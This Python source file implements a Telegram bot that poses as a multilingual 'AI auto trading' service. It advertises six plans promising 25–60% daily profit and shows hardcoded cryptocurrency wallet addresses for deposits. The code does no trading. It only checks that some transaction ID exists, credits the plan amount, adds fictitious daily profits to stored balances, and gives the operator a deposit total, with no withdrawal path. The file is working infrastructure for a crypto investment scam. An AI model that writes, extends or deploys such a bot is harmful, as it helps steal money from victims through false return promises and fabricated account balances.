import logging
import datetime
import asyncio
import aiohttp
import os

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackContext,
)

# ------------------------
# Environment Variables
# ------------------------
TGBOTTOKEN = os.environ["TGBOTTOKEN"]
WEBHOOK_BASE_URL = os.environ["WEBHOOK_URL"]  # e.g. "https://my-telegram-bot-cpji.onrender.com"

# ------------------------
# Logging
# ------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------
# Wallet Addresses
# ------------------------
WALLET_ADDRESSES = {
    "BTC": "bc1q9q75pdqn68kd9l3phk45lu9jdujuckewq6utp4",
    "ETH": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "BNB": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "SOL": "5ZE32mbM9Xy6hTvTUNjUrZ9NdmmBMRDgU9Gif4ytPsZg",
    "XRP": "rDBY4hZmoHzZJxkDbeeVdSU52WaXRtXSMJ",
    "USDT": {
        "BEP20": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
        "TRC20": "TXPJLFHcjfk9rGrHQkdC6nLqADg85Z9TT2",
        "TON": "UQAC8C-BwxCCQKybyR1I3faHNg_PtHnVS2VytwC9XhE2alLo",
    },
}

# ------------------------
# Admin ID (Replace with your Telegram user ID)
# ------------------------
ADMIN_ID = 7533239927

# ------------------------
# Database Setup (SQLite + SQLAlchemy)
# ------------------------
from sqlalchemy import create_engine, Column, Integer, String, Float, Boolean, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()
class UserAccount(Base):
    __tablename__ = "user_accounts"
    id              = Column(Integer, primary_key=True)
    telegram_id     = Column(Integer, unique=True, nullable=False)
    selected_plan   = Column(String, nullable=True)
    selected_crypto = Column(String, nullable=True)
    usdt_network    = Column(String, nullable=True)
    txid            = Column(String, nullable=True)
    deposit         = Column(Float, default=0)
    profit          = Column(Float, default=0)
    wallet_address  = Column(String, nullable=True)
    language        = Column(String, default="en")
    compound        = Column(Boolean, default=False)
    last_updated    = Column(DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)

engine = create_engine("sqlite:///crypto_bot.db", echo=False)
Base.metadata.create_all(engine)
SessionLocal = sessionmaker(bind=engine)
def get_session():
    return SessionLocal()

# ------------------------
# Multi-Language Dictionary
# ------------------------
LANG = {
    "en": {
        "welcome":         "Welcome to the AI Auto Trading Bot. Please choose an option:",
        "autotrading":     "Autotrading System",
        "balance":         "Balance",
        "contact_support": "Contact Support",
        "main_menu":       "Main Menu:",
        "deposit_success": "Deposit of ${amount:.2f} confirmed successfully! Please provide your wallet address for receiving your profits:",
        "activated":       "AI AUTO TRADING SYSTEM ACTIVATED.",
        "invalid_txid":    "Invalid transaction ID format. Please try again:",
        "txid_received":   "Transaction ID received: {txid}\nWe have verified a deposit of ${amount:.2f} based on your selected plan.\nPlease confirm the deposit.",
        "language_set":    "Your language has been set to English.",
        "choose_language": "Choose your language:",
        "compound_on":     "Compound profit activated.",
        "compound_off":    "Compound profit deactivated.",
        "admin_not_auth":  "You are not authorized to use this command.",
        "admin_report":    "Admin Report:\nTotal Users: {total_users}\nTotal Deposits: ${total_deposit:.2f}\nTotal Profit: ${total_profit:.2f}",
    },
    "es": {
        "welcome":         "Bienvenido al bot de trading automático con IA. Elige una opción:",
        "autotrading":     "Sistema de Autotrading",
        "balance":         "Balance",
        "contact_support": "Contactar Soporte",
        "main_menu":       "Menú Principal:",
        "deposit_success": "Depósito de ${amount:.2f} confirmado con éxito. Por favor, proporciona tu dirección de wallet para recibir ganancias:",
        "activated":       "SISTEMA DE AUTOTRADING ACTIVADO.",
        "invalid_txid":    "Formato de TXID inválido. Inténtalo de nuevo:",
        "txid_received":   "TXID recibido: {txid}\nHemos verificado un depósito de ${amount:.2f} basado en tu plan seleccionado.\nPor favor, confirma el depósito.",
        "language_set":    "Tu idioma se ha configurado a Español.",
        "choose_language": "Elige tu idioma:",
        "compound_on":     "Compounding activado.",
        "compound_off":    "Compounding desactivado.",
        "admin_not_auth":  "No estás autorizado para usar este comando.",
        "admin_report":    "Reporte de Admin:\nTotal Usuarios: {total_users}\nDepósitos Totales: ${total_deposit:.2f}\nGanancias Totales: ${total_profit:.2f}",
    },
    "ru": {
        "welcome":         "Добро пожаловать в бот автоматической торговли с ИИ. Пожалуйста, выберите опцию:",
        "autotrading":     "Система автоматической торговли",
        "balance":         "Баланс",
        "contact_support": "Связаться со службой поддержки",
        "main_menu":       "Главное меню:",
        "deposit_success": "Депозит в размере ${amount:.2f} успешно подтвержден! Пожалуйста, укажите адрес вашего кошелька для получения прибыли:",
        "activated":       "Система автоматической торговли с ИИ активирована.",
        "invalid_txid":    "Неверный формат ID транзакции. Попробуйте снова:",
        "txid_received":   "ID транзакции получен: {txid}\nМы подтвердили депозит в размере ${amount:.2f} на основе выбранного плана.\nПожалуйста, подтвердите депозит.",
        "language_set":    "Ваш язык установлен на русский.",
        "choose_language": "Выберите ваш язык:",
        "compound_on":     "Комплексное начисление прибыли активировано.",
        "compound_off":    "Комплексное начисление прибыли деактивировано.",
        "admin_not_auth":  "У вас нет прав для использования этой команды.",
        "admin_report":    "Отчет администратора:\nВсего пользователей: {total_users}\nОбщий депозит: ${total_deposit:.2f}\nОбщая прибыль: ${total_profit:.2f}",
    },
    "ar": {
        "welcome":         "مرحبًا بك في بوت التداول التلقائي بالذكاء الاصطناعي. الرجاء اختيار خيار:",
        "autotrading":     "نظام التداول التلقائي",
        "balance":         "الرصيد",
        "contact_support": "اتصل بالدعم",
        "main_menu":       "القائمة الرئيسية:",
        "deposit_success": "تم تأكيد إيداع بقيمة ${amount:.2f} بنجاح! يرجى تزويدنا بعنوان محفظتك لاستلام أرباحك:",
        "activated":       "تم تفعيل نظام التداول التلقائي بالذكاء الاصطناعي.",
        "invalid_txid":    "تنسيق TXID غير صالح. يرجى المحاولة مرة أخرى:",
        "txid_received":   "TXID المستلم: {txid}\nتم التحقق من إيداع بقيمة ${amount:.2f} استنادًا إلى الخطة المختارة.\nيرجى تأكيد الإيداع.",
        "language_set":    "تم تعيين لغتك إلى العربية.",
        "choose_language": "اختر لغتك:",
        "compound_on":     "تم تفعيل الربح المركب.",
        "compound_off":    "تم إيقاف الربح المركب.",
        "admin_not_auth":  "أنت غير مخول لاستخدام هذا الأمر.",
        "admin_report":    "تقرير المسؤول:\nإجمالي المستخدمين: {total_users}\nإجمالي الإيداعات: ${total_deposit:.2f}\nإجمالي الأرباح: ${total_profit:.2f}",
    },
    "id": {
        "welcome":         "Selamat datang di Bot Trading Otomatis AI. Silakan pilih opsi:",
        "autotrading":     "Sistem Autotrading",
        "balance":         "Saldo",
        "contact_support": "Hubungi Dukungan",
        "main_menu":       "Menu Utama:",
        "deposit_success": "Deposit sebesar ${amount:.2f} telah dikonfirmasi dengan sukses! Silakan masukkan alamat dompet Anda untuk menerima keuntungan:",
        "activated":       "Sistem Autotrading AI diaktifkan.",
        "invalid_txid":    "Format TXID tidak valid. Silakan coba lagi:",
        "txid_received":   "TXID diterima: {txid}\nKami telah memverifikasi deposit sebesar ${amount:.2f} berdasarkan rencana yang dipilih.\nSilakan konfirmasi deposit.",
        "language_set":    "Bahasa Anda telah diatur ke Bahasa Indonesia.",
        "choose_language": "Pilih bahasa Anda:",
        "compound_on":     "Keuntungan gabungan diaktifkan.",
        "compound_off":    "Keuntungan gabungan dinonaktifkan.",
        "admin_not_auth":  "Anda tidak memiliki otorisasi untuk menggunakan perintah ini.",
        "admin_report":    "Laporan Admin:\nTotal Pengguna: {total_users}\nTotal Deposit: ${total_deposit:.2f}\nTotal Keuntungan: ${total_profit:.2f}",
    },
    "de": {
        "welcome":         "Willkommen beim KI-Auto-Trading-Bot. Bitte wählen Sie eine Option:",
        "autotrading":     "Auto-Trading-System",
        "balance":         "Kontostand",
        "contact_support": "Kontaktieren Sie den Support",
        "main_menu":       "Hauptmenü:",
        "deposit_success": "Einzahlung von ${amount:.2f} wurde erfolgreich bestätigt! Bitte geben Sie Ihre Wallet-Adresse ein, um Ihre Gewinne zu erhalten:",
        "activated":       "KI-Auto-Trading-System wurde aktiviert.",
        "invalid_txid":    "Ungültiges TXID-Format. Bitte versuchen Sie es erneut:",
        "txid_received":   "TXID erhalten: {txid}\nWir haben eine Einzahlung von ${amount:.2f} basierend auf Ihrem gewählten Plan bestätigt.\nBitte bestätigen Sie die Einzahlung.",
        "language_set":    "Ihre Sprache wurde auf Deutsch eingestellt.",
        "choose_language": "Wählen Sie Ihre Sprache:",
        "compound_on":     "Gewinnzusammenrechnung aktiviert.",
        "compound_off":    "Gewinnzusammenrechnung deaktiviert.",
        "admin_not_auth":  "Sie sind nicht berechtigt, diesen Befehl zu verwenden.",
        "admin_report":    "Admin-Bericht:\nGesamtanzahl der Benutzer: {total_users}\nGesamteinzahlungen: ${total_deposit:.2f}\nGesamtgewinn: ${total_profit:.2f}",
    },
    "hi": {
        "welcome":         "एआई ऑटो ट्रेडिंग बोट में आपका स्वागत है। कृपया एक विकल्प चुनें:",
        "autotrading":     "ऑटो ट्रेडिंग सिस्टम",
        "balance":         "बैलेंस",
        "contact_support": "सपोर्ट से संपर्क करें",
        "main_menu":       "मुख्य मेनू:",
        "deposit_success": "₹{amount:.2f} का जमा सफलतापूर्वक पुष्टि हो गया है! कृपया लाभ प्राप्त करने के लिए अपना वॉलेट पता प्रदान करें:",
        "activated":       "एआई ऑटो ट्रेडिंग सिस्टम सक्रिय हो गया है।",
        "invalid_txid":    "अमान्य TXID प्रारूप। कृपया पुनः प्रयास करें:",
        "txid_received":   "TXID प्राप्त हुआ: {txid}\nहमने आपके चुने गए प्लान के आधार पर ₹{amount:.2f} का जमा पुष्टि किया है।\nकृपया जमा की पुष्टि करें।",
        "language_set":    "आपकी भाषा हिंदी में सेट हो गई है।",
        "choose_language": "अपनी भाषा चुनें:",
        "compound_on":     "कंपाउंड लाभ सक्रिय किया गया है।",
        "compound_off":    "कंपाउंड लाभ निष्क्रिय किया गया है।",
        "admin_not_auth":  "आपको इस कमांड का उपयोग करने की अनुमति नहीं है।",
        "admin_report":    "एडमिन रिपोर्ट:\nकुल उपयोगकर्ता: {total_users}\nकुल जमा: ₹{total_deposit:.2f}\nकुल लाभ: ₹{total_profit:.2f}",
    },
    "fr": {
        "welcome":         "Bienvenue sur le bot d'autotrading IA. Veuillez choisir une option :",
        "autotrading":     "Système d'autotrading",
        "balance":         "Solde",
        "contact_support": "Contacter le support",
        "main_menu":       "Menu principal :",
        "deposit_success": "Dépôt de ${amount:.2f} confirmé avec succès ! Veuillez fournir l'adresse de votre portefeuille pour recevoir vos gains :",
        "activated":       "Le système d'autotrading IA est activé.",
        "invalid_txid":    "Format TXID invalide. Veuillez réessayer :",
        "txid_received":   "TXID reçu : {txid}\nNous avons vérifié un dépôt de ${amount:.2f} selon votre plan sélectionné.\nVeuillez confirmer le dépôt.",
        "language_set":    "Votre langue a été définie sur le français.",
        "choose_language": "Choisissez votre langue :",
        "compound_on":     "Le profit composé est activé.",
        "compound_off":    "Le profit composé est désactivé.",
        "admin_not_auth":  "Vous n'êtes pas autorisé à utiliser cette commande.",
        "admin_report":    "Rapport Admin :\nTotal des utilisateurs : {total_users}\nTotal des dépôts : ${total_deposit:.2f}\nTotal des profits : ${total_profit:.2f}",
    },
    "zh": {
        "welcome":         "欢迎使用 AI 自动交易机器人。请选择一个选项：",
        "autotrading":     "自动交易系统",
        "balance":         "余额",
        "contact_support": "联系支持",
        "main_menu":       "主菜单：",
        "deposit_success": "存款 ${amount:.2f} 已成功确认！请提供您的钱包地址以接收收益：",
        "activated":       "AI 自动交易系统已激活。",
        "invalid_txid":    "无效的 TXID 格式。请重试：",
        "txid_received":   "收到 TXID：{txid}\n我们已根据您选择的计划验证了 ${amount:.2f} 的存款。\n请确认存款。",
        "language_set":    "您的语言已设置为中文。",
        "choose_language": "请选择您的语言：",
        "compound_on":     "复利激活。",
        "compound_off":    "复利已停用。",
        "admin_not_auth":  "您无权使用此命令。",
        "admin_report":    "管理员报告：\n用户总数：{total_users}\n总存款：${total_deposit:.2f}\n总利润：${total_profit:.2f}",
    },
}

def get_msg(lang, key, **kwargs):
    template = LANG.get(lang, LANG["en"]).get(key, "")
    return template.format(**kwargs) if kwargs else template

# ------------------------
# Trading Plans
# ------------------------
TRADING_PLANS = {
    "plan_1": {"title": "🚨FIRST PLAN",  "equity_range": "$500 - $999",       "profit_percent": 25},
    "plan_2": {"title": "🚨SECOND PLAN", "equity_range": "$1,000 - $4,999",     "profit_percent": 30},
    "plan_3": {"title": "🚨THIRD PLAN",  "equity_range": "$5,000 - $9,999",     "profit_percent": 45},
    "plan_4": {"title": "🚨FOURTH PLAN", "equity_range": "$10,000 - $49,999",   "profit_percent": 50},
    "plan_5": {"title": "🚨FIFTH PLAN",  "equity_range": "$50,000 - $199,999",   "profit_percent": 55},
    "plan_6": {"title": "🚨SIXTH PLAN",  "equity_range": "$200,000 and above",  "profit_percent": 60},
}

# ------------------------
# Conversation States
# ------------------------
STATE_TXID = 1
STATE_CONFIRM = 2
STATE_WALLET = 3

# ------------------------
# Transaction Verification Function
# ------------------------
async def verify_txid_on_blockchain(txid: str, crypto: str, context: CallbackContext = None) -> bool:
    crypto = crypto.upper()
    async with aiohttp.ClientSession() as session:
        try:
            if crypto == "ETH":
                key = os.environ["ETHERSCAN_API_KEY"]
                url = f"https://api.etherscan.io/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"
            elif crypto == "BTC":
                token = os.environ["BLOCKCYPHER_TOKEN"]
                url = f"https://api.blockcypher.com/v1/btc/main/txs/{txid}?token={token}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("confirmations", 0) > 0
            elif crypto == "BNB":
                key = os.environ["BSCSCAN_API_KEY"]
                url = f"https://api.bscscan.com/api?module=transaction&action=getstatus&txhash={txid}&apikey={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1"
            elif crypto == "SOL":
                url = "https://api.mainnet-beta.solana.com/"
                payload = {"jsonrpc": "2.0", "id": 1, "method": "getTransaction", "params": [txid, {"encoding":"json"}]}
                r = await session.post(url, json=payload, timeout=10)
                data = await r.json()
                return data.get("result") is not None
            elif crypto == "XRP":
                url = f"https://data.ripple.com/v2/transactions/{txid}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("result") == "success"
            elif crypto == "TRX":
                key = os.environ["TRONSCAN_API_KEY"]
                url = f"https://apilist.tronscan.org/api/transaction-info?hash={txid}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                ret = data.get("ret")
                return isinstance(ret, list) and ret and ret[0].get("contractRet") == "SUCCESS"
            elif crypto == "TON":
                key = os.environ["TONCENTER_API_KEY"]
                url = f"https://toncenter.com/api/v2/getTransaction?hash={txid}&api_key={key}"
                r = await session.get(url, timeout=10)
                data = await r.json()
                return data.get("result") is not None
            elif crypto == "USDT":
                net = context.user_data.get("usdt_network", "ETH")
                return await verify_txid_on_blockchain(txid, net, context)
        except Exception as e:
            logger.error("Error verifying %s TXID: %s", crypto, e)
    return False

# ------------------------
# Daily Profit Update Function
# ------------------------
async def update_daily_profits(context: CallbackContext):
    session = get_session()
    users = session.query(UserAccount).all()
    for user in users:
        if user.selected_plan and user.deposit > 0:
            rate = TRADING_PLANS[user.selected_plan]["profit_percent"] / 100
            profit = user.deposit * rate
            user.profit += profit
            if user.compound:
                user.deposit += profit
    session.commit()
    session.close()
    logger.info("Daily profits updated.")

# ------------------------
# Global Error Handler
# ------------------------
async def error_handler(update: object, context: CallbackContext):
    logger.error("Exception while handling an update:", exc_info=context.error)

# ------------------------
# Handlers Start Here
# ------------------------
async def start(update: Update, context: CallbackContext):
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    if not user or not user.language:
        await choose_language(update, context)
    else:
        lang = user.language
        kb = [
            [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
            [InlineKeyboardButton(get_msg(lang, "balance"), callback_data="balance")],
            [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
        ]
        await update.message.reply_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))

async def main_menu(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"), callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    await update.callback_query.edit_message_text(get_msg(lang, "main_menu"), reply_markup=InlineKeyboardMarkup(kb))

async def autotrading_menu(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    lines = ["AI AUTO TRADING PLANS:"]
    for key, plan in TRADING_PLANS.items():
        lines.extend([
            "",
            plan["title"],
            f"Equity Range: {plan['equity_range']}",
            f"Profit: {plan['profit_percent']}% daily.",
            "ROI: Yes ✅"
        ])
    kb = [
        [InlineKeyboardButton("FIRST PLAN", callback_data="plan_1"),
         InlineKeyboardButton("SECOND PLAN", callback_data="plan_2")],
        [InlineKeyboardButton("THIRD PLAN", callback_data="plan_3"),
         InlineKeyboardButton("FOURTH PLAN", callback_data="plan_4")],
        [InlineKeyboardButton("FIFTH PLAN", callback_data="plan_5"),
         InlineKeyboardButton("SIXTH PLAN", callback_data="plan_6")],
        [InlineKeyboardButton("BACK", callback_data="main_menu")],
    ]
    await update.callback_query.edit_message_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(kb))

async def plan_selection(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    plan = update.callback_query.data
    context.user_data["selected_plan"] = plan
    details = TRADING_PLANS[plan]
    text = (f"You selected {details['title']}:\n"
            f"Equity Range: {details['equity_range']}\n"
            f"Profit: {details['profit_percent']}% daily.\n\n"
            "Please choose your deposit currency:")
    kb = [
        [InlineKeyboardButton("BTC", callback_data="pay_btc"),
         InlineKeyboardButton("ETH", callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB", callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL", callback_data="pay_sol"),
         InlineKeyboardButton("XRP", callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def payment_method_menu(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    plan = context.user_data.get("selected_plan")
    if plan in TRADING_PLANS:
        text = f"You selected {TRADING_PLANS[plan]['title']}.\nChoose your deposit currency:"
    else:
        text = "Choose your deposit currency:"
    kb = [
        [InlineKeyboardButton("BTC", callback_data="pay_btc"),
         InlineKeyboardButton("ETH", callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB", callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL", callback_data="pay_sol"),
         InlineKeyboardButton("XRP", callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def usdt_network_menu(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    kb = [
        [InlineKeyboardButton("USDT BEP20", callback_data="usdt_BEP20"),
         InlineKeyboardButton("USDT TRC20", callback_data="usdt_TRC20"),
         InlineKeyboardButton("USDT TON", callback_data="usdt_TON")],
        [InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text("USDT selected. Please choose the USDT network:",
                                                  reply_markup=InlineKeyboardMarkup(kb))

async def send_deposit_address(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    data = update.callback_query.data
    if data.startswith("pay_"):
        crypto = data.split("_")[1].upper()
        network = None
    elif data.startswith("usdt_"):
        crypto = "USDT"
        network = data.split("_")[1]
        context.user_data["usdt_network"] = network
    else:
        return
    context.user_data["selected_crypto"] = crypto
    if crypto == "USDT" and network:
        addr = WALLET_ADDRESSES["USDT"].get(network, "Not configured")
        disp = f"{crypto} ({network})"
    else:
        addr = WALLET_ADDRESSES.get(crypto, "Not configured")
        disp = crypto
    text = (f"Please deposit using {disp} to the following address:\n\n"
            f"<code>{addr}</code>\n\nWhen done, click DONE.")
    kb = [
        [InlineKeyboardButton("DONE", callback_data="deposit_done"),
         InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text(text=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def payment_callback_handler(update: Update, context: CallbackContext):
    data = update.callback_query.data
    if data in ("pay_btc", "pay_eth", "pay_bnb", "pay_sol", "pay_xrp"):
        await send_deposit_address(update, context)
    elif data == "pay_usdt":
        await usdt_network_menu(update, context)
    elif data.startswith("usdt_"):
        await send_deposit_address(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)

async def deposit_done_callback(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    await update.callback_query.edit_message_text("Please enter your transaction ID:")
    return STATE_TXID

async def handle_txid(update: Update, context: CallbackContext):
    txid = update.message.text.strip()
    crypto = context.user_data.get("selected_crypto", "BTC")
    if not await verify_txid_on_blockchain(txid, crypto, context):
        session = get_session()
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        lang = user.language if user else "en"
        session.close()
        await update.message.reply_text(get_msg(lang, "invalid_txid"))
        return STATE_TXID
    context.user_data["txid"] = txid
    plan = context.user_data.get("selected_plan")
    deposit_amount = {"plan_1":500, "plan_2":1000, "plan_3":5000, "plan_4":10000, "plan_5":50000, "plan_6":200000}.get(plan, 0)
    context.user_data["deposit"] = deposit_amount
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    session.close()
    text = get_msg(lang, "txid_received", txid=txid, amount=deposit_amount)
    kb = [
        [InlineKeyboardButton("YES", callback_data="confirm_yes"),
         InlineKeyboardButton("NO", callback_data="confirm_no")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))
    return STATE_CONFIRM

async def confirm_deposit_callback(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    choice = update.callback_query.data
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    session.close()
    if choice == "confirm_yes":
        amt = context.user_data.get("deposit", 0)
        await update.callback_query.edit_message_text(get_msg(lang, "deposit_success", amount=amt))
        return STATE_WALLET
    else:
        await update.callback_query.edit_message_text("Please enter your transaction ID again:")
        return STATE_TXID

async def handle_wallet(update: Update, context: CallbackContext):
    wallet_address = update.message.text.strip()
    context.user_data["wallet_address"] = wallet_address
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.selected_plan   = context.user_data.get("selected_plan")
        user.selected_crypto = context.user_data.get("selected_crypto")
        user.usdt_network    = context.user_data.get("usdt_network")
        user.txid            = context.user_data.get("txid")
        user.deposit         = context.user_data.get("deposit", 0)
        user.wallet_address  = wallet_address
    else:
        user = UserAccount(
            telegram_id     = update.effective_user.id,
            selected_plan   = context.user_data.get("selected_plan"),
            selected_crypto = context.user_data.get("selected_crypto"),
            usdt_network    = context.user_data.get("usdt_network"),
            txid            = context.user_data.get("txid"),
            deposit         = context.user_data.get("deposit", 0),
            profit          = 0.0,
            wallet_address  = wallet_address,
            language        = "en"
        )
        session.add(user)
    session.commit()
    session.close()
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    session.close()
    await update.message.reply_text(get_msg(lang, "activated"))
    return ConversationHandler.END

async def cancel_deposit(update: Update, context: CallbackContext):
    await update.message.reply_text("Deposit process cancelled.")
    return ConversationHandler.END

async def balance_handler(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    if user:
        d = user.deposit
        p = user.profit
        t = d + p
        text = f"Your current balance:\nDeposit: ${d:.2f}\nProfit: ${p:.2f}\nTotal: ${t:.2f}"
    else:
        text = "Balance: $0"
    kb = [[InlineKeyboardButton("BACK", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def choose_language(update: Update, context: CallbackContext):
    kb = [
        [InlineKeyboardButton("English", callback_data="lang_en"),
         InlineKeyboardButton("Español", callback_data="lang_es")],
        [InlineKeyboardButton("Русский", callback_data="lang_ru"),
         InlineKeyboardButton("العربية", callback_data="lang_ar")],
        [InlineKeyboardButton("Bahasa Indonesia", callback_data="lang_id"),
         InlineKeyboardButton("Deutsch", callback_data="lang_de")],
        [InlineKeyboardButton("हिन्दी", callback_data="lang_hi"),
         InlineKeyboardButton("Français", callback_data="lang_fr")],
        [InlineKeyboardButton("中文", callback_data="lang_zh")]
    ]
    await update.message.reply_text(get_msg("en", "choose_language"), reply_markup=InlineKeyboardMarkup(kb))

async def set_language(update: Update, context: CallbackContext):
    await update.callback_query.answer()
    lang = update.callback_query.data.split("_")[1]
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.language = lang
    else:
        session.add(UserAccount(telegram_id=update.effective_user.id, language=lang))
    session.commit()
    session.close()
    await update.callback_query.edit_message_text(get_msg(lang, "language_set"))

async def toggle_compound(update: Update, context: CallbackContext):
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.compound = not user.compound
        session.commit()
        msg = get_msg(user.language, "compound_on") if user.compound else get_msg(user.language, "compound_off")
        await update.message.reply_text(msg)
    else:
        await update.message.reply_text(get_msg("en", "compound_off"))
    session.close()

async def admin_dashboard(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    session = get_session()
    users = session.query(UserAccount).all()
    total_users   = len(users)
    total_deposit = sum(u.deposit for u in users)
    total_profit  = sum(u.profit for u in users)
    session.close()
    await update.message.reply_text(get_msg("en", "admin_report",
                                             total_users=total_users,
                                             total_deposit=total_deposit,
                                             total_profit=total_profit))

async def callback_dispatcher(update: Update, context: CallbackContext):
    data = update.callback_query.data
    if data == "main_menu":
        await main_menu(update, context)
    elif data == "autotrading":
        await autotrading_menu(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)
    elif data == "balance":
        await balance_handler(update, context)
    elif data.startswith("plan_"):
        await plan_selection(update, context)
    elif data.startswith("pay_") or data.startswith("usdt_"):
        await payment_callback_handler(update, context)
    elif data in ("deposit_done",):
        await deposit_done_callback(update, context)
    elif data in ("confirm_yes", "confirm_no"):
        await confirm_deposit_callback(update, context)
    elif data.startswith("lang_"):
        await set_language(update, context)
    else:
        await update.callback_query.answer(text="Option not handled.")

# ------------------------
# Main: Build Application & Run via Webhook (no Flask)
# ------------------------
def main() -> None:
    port = int(os.environ.get("PORT", 8080))
    app_bot = Application.builder().token(TGBOTTOKEN).build()
    logger.info("🐳 Starting webhook server...")

    # Conversation handler for deposit flow
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_done_callback, pattern="^deposit_done$")],
        states={
            STATE_TXID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_txid)],
            STATE_CONFIRM: [CallbackQueryHandler(confirm_deposit_callback, pattern="^confirm_")],
            STATE_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True,
    )

    # Register all handlers
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("language", choose_language))
    app_bot.add_handler(CommandHandler("compound", toggle_compound))
    app_bot.add_handler(CommandHandler("admin", admin_dashboard))
    app_bot.add_handler(conv_handler)
    app_bot.add_handler(CallbackQueryHandler(callback_dispatcher))
    app_bot.add_error_handler(error_handler)

    # Schedule daily profit updates at midnight UTC
    job_time = datetime.time(hour=0, minute=0, second=0)
    app_bot.job_queue.run_daily(update_daily_profits, time=job_time)

    # Run the bot via webhooks on PORT
    app_bot.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TGBOTTOKEN,
        webhook_url=f"{WEBHOOK_BASE_URL}/{TGBOTTOKEN}"
    )

if __name__ == "__main__":
    main()